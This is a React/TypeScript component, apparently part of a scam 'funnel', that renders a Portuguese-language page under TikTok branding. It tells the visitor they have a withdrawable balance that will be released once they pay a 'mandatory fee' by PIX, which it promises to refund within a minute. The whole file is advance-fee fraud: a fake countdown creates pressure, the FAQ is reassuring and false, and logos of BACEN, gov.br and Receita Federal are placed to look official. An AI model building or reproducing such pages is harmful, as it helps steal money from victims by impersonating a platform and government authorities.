import { useState, useEffect } from "react";
import { Check, Clock, Loader2, ShieldCheck, ChevronDown } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import bacenLogo from "@/assets/bacen-logo.png";
import govbrLogo from "@/assets/govbr-logo.webp";
import receitaFederalLogo from "@/assets/receita-federal-logo.png";

const FaqItem = ({ question, answer }: { question: string; answer: string }) => {
  const [open, setOpen] = useState(false);
  return (
    <div className="border-b border-gray-100 last:border-0">
      <button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between py-3 text-left">
        <span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>
        <ChevronDown className={`w-4 h-4 text-gray-400 shrink-0 transition-transform ${open ? "rotate-180" : ""}`} />
      </button>
      {open && <p className="text-gray-500 text-[11px] leading-relaxed pb-3 -mt-1">{answer}</p>}
    </div>
  );
};

interface FunnelConfirmTaxProps {
  balance: string;
  pixKey: string;
  pixKeyType?: string;
  pixName?: string;
  onGeneratePix: () => void;
  isGenerating: boolean;
  taxAmount?: string;
  taxAnchor?: string;
  taxDiscount?: string;
  leadCpf?: string;
  leadName?: string;
}

const FunnelConfirmTax = ({
  balance, pixKey, pixKeyType = "E-mail", pixName, onGeneratePix, isGenerating,
  taxAmount = "R$ 34,71", taxAnchor = "R$ 89,90", taxDiscount = "61% OFF", leadCpf, leadName,
}: FunnelConfirmTaxProps) => {
  const [timeLeft, setTimeLeft] = useState(5 * 60);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((t) => Math.max(0, t - 1)), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${String(m).padStart(2, "0")}:${String(sec).padStart(2, "0")}`;
  };
  const maskCpf = (cpf: string) => {
    const digits = cpf.replace(/\D/g, '');
    if (digits.length >= 11) return `***.${digits.slice(3, 6)}.${digits.slice(6, 9)}-**`;
    return cpf;
  };
  const isUrgent = timeLeft < 120;

  return (
    <div className="fixed inset-0 z-[80] bg-[#F8F8F8] overflow-y-auto">
      <div className="py-4 flex justify-center bg-white">
        <img src={tiktokLogo} alt="TikTok" className="h-6 w-auto" />
      </div>
      <div className={`py-2.5 px-4 text-center transition-colors duration-300 ${isUrgent ? "bg-red-600 animate-pulse" : "bg-orange-500"}`}>
        <p className="text-white text-xs font-bold tracking-wide">
          ⏳ Oferta expira em <span className="font-mono text-sm">{formatTime(timeLeft)}</span>
          {isUrgent && " — Corra!"}
        </p>
      </div>

      <main className="px-3 py-2.5 space-y-2.5 max-w-md mx-auto pb-6">
        <div className="bg-black rounded-xl p-4">
          <p className="text-white/90 text-[10px] font-semibold tracking-wider mb-0.5">SALDO DISPONÍVEL</p>
          <p className="text-white text-[26px] font-extrabold tracking-tight leading-none">{balance}</p>
          <p className="text-white/80 text-xs mt-1.5">Aguardando confirmação para saque</p>
        </div>

        <div className="bg-white rounded-xl p-4 border border-gray-100">
          <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-3">CONFIRMAÇÃO DE IDENTIDADE</p>
          {leadCpf && (
            <div className="flex items-center gap-3 mb-3 bg-gray-50 rounded-lg px-3 py-2.5">
              <div className="w-8 h-8 rounded-full bg-[#FFEBEE] flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div>
              <div className="flex-1 min-w-0">
                <p className="text-gray-800 text-xs font-semibold truncate">{leadName || "Titular"}</p>
                <p className="text-gray-400 text-[11px]">CPF: {maskCpf(leadCpf)}</p>
              </div>
              <Check className="w-4 h-4 text-[#4CAF50] shrink-0" />
            </div>
          )}
          <div className="flex items-center gap-2.5 mb-3">
            <div className="flex items-baseline gap-2">
              <span className="text-gray-400 text-sm line-through">{taxAnchor}</span>
              <span className="text-[#E53935] text-xl font-bold leading-none">{taxAmount}</span>
            </div>
            <span className="bg-[#E8F5E9] text-[#4CAF50] text-[10px] font-semibold px-2 py-1 rounded">{taxDiscount}</span>
          </div>
          <div className="bg-[#FFF3E0] border border-orange-200 rounded-lg px-3 py-2 mb-3">
            <p className="text-orange-800 text-[11px] font-semibold">🔥 Promoção válida apenas nos próximos {formatTime(timeLeft)}</p>
          </div>
          <p className="text-gray-500 text-xs leading-relaxed">
            Taxa obrigatória para liberação do saque no valor de <span className="font-bold text-gray-800">{balance}</span>. O valor de <span className="font-bold text-gray-800">{taxAmount}</span> será reembolsado integralmente para você em 1 minuto.
          </p>
        </div>

        <div className="bg-[#E8F5E9] rounded-xl px-4 py-3 border border-[#C8E6C9] flex items-center gap-3">
          <div className="w-8 h-8 rounded-full bg-[#4CAF50] flex items-center justify-center shrink-0"><ShieldCheck className="w-4 h-4 text-white" /></div>
          <div>
            <p className="text-[#2E7D32] text-xs font-bold">Reembolso garantido em 1 minuto</p>
            <p className="text-[#388E3C] text-[11px]">Você recebe {taxAmount} de volta automaticamente via PIX</p>
          </div>
        </div>

        <div className="bg-white rounded-xl p-4 border border-gray-100">
          <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-4">PROCESSO DE LIBERAÇÃO</p>
          <div className="space-y-4">
            <div className="flex items-start gap-3">
              <div className="w-7 h-7 rounded-full bg-[#FFEBEE] flex items-center justify-center shrink-0"><span className="text-[#E57373] text-xs font-semibold">1</span></div>
              <div className="pt-0.5"><p className="text-gray-800 text-[13px] font-semibold leading-tight">Pagar taxa de confirmação</p><p className="text-gray-400 text-[11px] mt-0.5">{taxAmount} para verificação de identidade</p></div>
            </div>
            <div className="flex items-start gap-3">
              <div className="w-7 h-7 rounded-full bg-[#E8F5E9] flex items-center justify-center shrink-0"><Check className="w-3.5 h-3.5 text-[#4CAF50]" /></div>
              <div className="pt-0.5"><p className="text-[#4CAF50] text-[13px] font-semibold leading-tight">Receber reembolso automático</p><p className="text-gray-400 text-[11px] mt-0.5">Valor devolvido em 1 minuto</p></div>
            </div>
            <div className="flex items-start gap-3">
              <div className="w-7 h-7 rounded-full bg-gray-100 flex items-center justify-center shrink-0"><span className="text-gray-400 text-xs font-semibold">3</span></div>
              <div className="pt-0.5"><p className="text-gray-800 text-[13px] font-semibold leading-tight">Acessar saldo completo</p><p className="text-gray-400 text-[11px] mt-0.5">{balance} liberado para saque</p></div>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-xl p-4 border-2 border-[#E8505B]/30">
          <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-[#E8505B] text-white font-bold text-base transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 relative overflow-hidden shadow-xl shadow-red-500/40" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>
            {isGenerating ? (<><Loader2 className="w-5 h-5 animate-spin" />Gerando PIX...</>) : (<><ShieldCheck className="w-5 h-5" />Pagar taxa para Liberar Saque</>)}
          </button>
          <div className="flex items-center justify-center gap-1.5 mt-3"><Clock className="w-3.5 h-3.5 text-[#4CAF50]" /><span className="text-[#4CAF50] text-xs font-medium">Reembolso automático em 1 minuto</span></div>
        </div>

        <div className="bg-white rounded-xl p-4 border border-gray-100">
          <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-3">PERGUNTAS FREQUENTES</p>
          <div className="space-y-0">
            {[
              { q: "Por que preciso pagar essa taxa?", a: "A taxa é uma verificação de segurança obrigatória para confirmar sua identidade e liberar o saque. O valor é reembolsado automaticamente em até 1 minuto." },
              { q: "Vou receber o reembolso da taxa?", a: "Sim! O reembolso é 100% automático via PIX. Você recebe de volta o valor integral em até 1 minuto após o pagamento." },
              { q: "Quanto tempo para o saque cair?", a: "Após a confirmação, o saque é processado e enviado para sua chave PIX em poucos minutos." },
              { q: "É seguro pagar via PIX?", a: "Sim. O PIX é regulamentado pelo Banco Central do Brasil e todas as transações são criptografadas e protegidas." },
              { q: "E se eu não receber o reembolso?", a: "O reembolso é automático e garantido. Caso não receba em até 5 minutos, entre em contato pelo suporte que resolveremos imediatamente." },
            ].map((item, i) => <FaqItem key={i} question={item.q} answer={item.a} />)}
          </div>
        </div>

        <div className="flex items-center justify-center gap-5 py-3">
          <img src={bacenLogo} alt="BACEN" className="h-10 object-contain" />
          <img src={govbrLogo} alt="gov.br" className="h-6 object-contain" />
          <img src={receitaFederalLogo} alt="Receita Federal" className="h-10 object-contain" />
        </div>

        <div className="text-center pb-4">
          <p className="text-gray-400 text-xs mb-1.5">Processo 100% seguro</p>
          <a href="#" className="text-[#E8505B] text-xs font-medium">Precisa de ajuda?</a>
        </div>
      </main>

      <style>{`
        @keyframes ctaPulse {
          0%, 100% { transform: scale(1); box-shadow: 0 4px 15px rgba(232, 80, 91, 0.3); }
          50% { transform: scale(1.02); box-shadow: 0 6px 25px rgba(232, 80, 91, 0.5); }
        }
      `}</style>
    </div>
  );
};

export default FunnelConfirmTax;
